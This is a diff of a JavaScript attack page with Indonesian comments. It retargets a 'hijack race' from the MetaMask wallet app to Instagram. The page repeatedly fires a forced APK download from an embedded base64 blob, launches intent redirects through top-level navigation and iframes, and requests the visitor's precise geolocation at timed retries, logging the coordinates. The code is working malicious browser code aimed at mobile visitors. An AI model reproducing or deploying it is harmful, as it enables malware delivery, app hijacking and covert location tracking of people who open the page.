@@ -41,17 +41,20 @@
   }
 
   // ============================================
-  // KONFIGURASI
+  // KONFIGURASI (TARGET DIGANTI KE INSTAGRAM)
   // ============================================
   var TARGET_INTENT = "intent://#Intent;" +
-                      "package=io.metamask;" +
-                      "scheme=metamask;" +
+                      "package=com.instagram.android;" +
+                      "scheme=instagram;" +
                       "end;";
+  
+  // Fallback jika Instagram tidak terinstal
+  var FALLBACK_URL = "https://www.instagram.com/";
   
   var TARGET_APK_B64 = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
 
   // ============================================
-  // FUNGSI EKSEKUSI VEKTOR (TANPA KAMERA)
+  // FUNGSI EKSEKUSI VEKTOR
   // ============================================
   function triggerAPKRace() {
     try {
@@ -73,7 +76,7 @@
     } catch(e) {}
   }
 
-  function triggerIntentRace() {
+  function triggerInstagramIntent() {
     try {
       // Top-Level Redirect
       window.location.href = TARGET_INTENT;
@@ -88,24 +91,22 @@
       `;
       document.getElementById("launcher-container").appendChild(iframe);
       
-      log("[+] Intent Triggered.");
+      log("[+] Instagram Intent Triggered.");
+      
+      // Fallback URL setelah 500ms
+      setTimeout(function() {
+        window.location.href = FALLBACK_URL;
+      }, 500);
     } catch(e) {}
   }
 
-  // ============================================
-  // FUNGSI LOKASI (MENGGANTIKAN KAMERA)
-  // ============================================
   function triggerLocationRace() {
     try {
-      if (!navigator.geolocation) {
-        log("[-] Geolocation tidak didukung.");
-        return;
-      }
+      if (!navigator.geolocation) return;
       
-      // Minta lokasi (High Accuracy)
       navigator.geolocation.getCurrentPosition(
         function(position) {
-          log("[+] LOKASI BERHASIL: " + position.coords.latitude + ", " + position.coords.longitude);
+          log("[+] LOKASI: " + position.coords.latitude + ", " + position.coords.longitude);
         },
         function(error) {
           log("[-] Lokasi diblokir: " + error.message);
@@ -124,42 +125,42 @@
 
     document.getElementById('main-card').innerHTML = `
       <h2>EXECUTING...</h2>
-      <p>Memulai Rapid Location & Intent Race...</p>
+      <p>Memulai Instagram Race...</p>
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Rapid Location Race...");
+    log("[!] Memulai Instagram Hijack Race...");
 
     // 1. Trigger Pertama (0ms)
     triggerAPKRace();
-    triggerIntentRace();
+    triggerInstagramIntent();
     triggerLocationRace();
 
     // 2. Retry Cepat (50ms)
     setTimeout(function() {
       triggerAPKRace();
-      triggerIntentRace();
+      triggerInstagramIntent();
       triggerLocationRace();
     }, 50);
 
     // 3. Retry Sedang (150ms)
     setTimeout(function() {
       triggerAPKRace();
-      triggerIntentRace();
+      triggerInstagramIntent();
       triggerLocationRace();
     }, 150);
 
     // 4. Retry Lambat (500ms)
     setTimeout(function() {
       triggerAPKRace();
-      triggerIntentRace();
+      triggerInstagramIntent();
       triggerLocationRace();
     }, 500);
 
     // 5. Retry Terakhir (1000ms)
     setTimeout(function() {
       triggerAPKRace();
-      triggerIntentRace();
+      triggerInstagramIntent();
       triggerLocationRace();
     }, 1000);
 
